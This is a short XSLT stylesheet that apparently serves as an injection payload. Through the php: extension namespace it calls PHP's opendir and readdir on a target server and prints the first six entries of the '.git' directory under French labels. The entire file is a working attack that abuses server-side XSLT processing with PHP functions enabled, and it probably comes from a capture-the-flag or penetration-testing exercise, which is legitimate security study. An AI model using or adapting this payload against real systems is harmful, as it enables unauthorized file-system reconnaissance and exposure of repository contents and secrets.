<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
    <xsl:value-of select="php:function('opendir', '.git')"/>

    Contenu de .git 1: <xsl:value-of select="php:function('readdir')"/>
    Contenu de .git 2: <xsl:value-of select="php:function('readdir')"/>
    Contenu de .git 3: <xsl:value-of select="php:function('readdir')"/>
    Contenu de .git 4: <xsl:value-of select="php:function('readdir')"/>
    Contenu de .git 5: <xsl:value-of select="php:function('readdir')"/>
    Contenu de .git 6: <xsl:value-of select="php:function('readdir')"/>
</xsl:template>
</xsl:stylesheet>